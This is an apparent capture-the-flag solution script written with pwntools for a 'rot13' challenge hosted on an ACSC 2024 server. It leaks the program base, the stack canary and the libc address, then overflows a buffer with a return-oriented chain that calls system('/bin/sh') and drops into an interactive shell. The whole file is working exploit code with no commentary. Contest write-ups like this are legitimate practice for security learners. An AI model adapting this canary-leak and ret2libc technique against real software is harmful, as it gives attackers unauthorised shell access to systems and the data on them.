from pwn import *

if args.LOCAL:
    io = process('./rot13_patched')
    if args.GDB:
        cmd = """
        """
        gdb.attach(io, cmd)
else:
    io = remote('rot13.chal.2024.ctf.acsc.asia', 9999)

libc = ELF('./libc.so.6')

pause()

pl = b''
for i in range(127):
    pl += p8(0xff-i)
 
io.sendline(pl)

io.recvuntil(b'Result: ')

pie = u64(io.recv(8)[::-1]) - 0x158d
print(hex(pie))
io.recv(8)
canary = u64(io.recv(8)[::-1])
print(hex(canary))

tar = io.recv(0x58)

libc.address = u64(io.recv(8)[::-1]) - 0x829f7
print(hex(libc.address))


pl = b'A'*0x108 + p64(canary)+ p64(libc.address+0x000000000002a3e6)*2  +p64(libc.address+0x000000000002a3e5) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)

io.sendline(pl)


pause()
io.sendline(b'\n')

io.interactive()

